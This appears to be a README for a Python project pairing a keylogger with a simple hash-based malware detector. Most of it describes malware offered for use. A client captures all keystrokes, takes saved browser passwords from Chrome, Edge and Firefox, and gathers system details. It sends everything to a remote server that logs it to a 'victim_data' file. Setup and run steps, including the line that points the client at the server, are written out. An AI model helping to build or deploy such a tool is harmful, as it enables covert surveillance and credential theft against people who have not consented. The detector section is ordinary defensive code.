# Keylogger Project And Simple Malware Detector

This project implements a simple keylogger that captures keystrokes from a client machine and sends them to a server for logging purposes. It also includes features to gather browser data and system information.

## Features

- **Keylogging:** Captures all keystrokes made on the client machine.
- **Network Communication:** Sends captured keystrokes over the network to a remote server.
- **Logging:** Logs keystrokes into a text file on the server.
- **Browser Data Theft:** Gathers saved passwords from browsers like Chrome, Edge, and Firefox.
- **System Information Gathering:** Collects host name, IP addresses, OS details, processor info, disk usage, and memory statistics.

### Malware Detector

The malware detector script analyzes files extracted from a specified archive. It calculates cryptographic hashes of files using various hashing algorithms (MD5, SHA-1, SHA-224, SHA-256, SHA3-384, SHA3-512) and compares them against a list of known malicious hashes. If a match is found, it identifies the file as potentially malicious.

## Requirements

- Python 3.x
- `pynput` library (for capturing keystrokes)
- `socket` library (for network communication)
- `os` module (for operating system related functions)
- `sqlite3` module (for accessing SQLite databases)
- `requests` library (for making HTTP requests)
- `json` module (for JSON data handling)
- `psutil` library (for system and process utilities)
- `platform` module (for retrieving system information)
- `pathlib` module (for handling file paths and directories)
- `shutil` module (for unpacking archives)
- `rarfile` library (optional, for handling RAR archives)
- `hashlib` module (for calculating file hashes using various algorithms)

## Installation and Setup

1. **Clone the repository:**

    ```bash
    git clone https://github.com/Oxshady/Keylogger--_-.git
    cd keylogger
    ```

2. **Install dependencies:**

    ```bash
    pip install pynput
    ```

    Ensure all required modules (`pathlib`, `shutil`, `rarfile` if used, `hashlib`) are available in your Python environment.

## Usage

### Setting up the Server

1. **Run the server script:**

    ```bash
    python server.py
    ```

    This script starts the server, listens for incoming connections, and logs keystrokes received from clients into a file (`./victim_data.txt`).

### Running the Keylogger Client

1. **Configure the Keylogger Client:**

    Modify `client.py` with the IP address and port of your server:

    ```python
    ke = Keylogger("server_ip", 9999)  # Replace with your server's IP and port
    ```

2. **Run the keylogger client script:**

    ```bash
    python client.py
    ```

    This script connects to the specified server and starts capturing keystrokes. It also gathers browser data and system information, sending all collected data to the server for logging.

## Troubleshooting

- **Connection Issues:** Ensure the server and client are running on the same network or have proper network access.
- **File Permissions:** Ensure the server has write permissions for the `./victim_data.txt` file in the project directory.

## Acknowledgments

- Thanks to the developers of `pynput`, `socket`, `sqlite3`, `requests`, `psutil`, `platform`, `pathlib`, `shutil`, `rarfile`, and `hashlib` libraries/modules for their contributions.

---

Ensure to adjust the IP address, port number, and paths in the scripts (`client.py` and `server.py`) according to your setup. This README provides a comprehensive overview of your keylogger project, including how it captures browser data, system information, and its integration with the malware detector functionality.
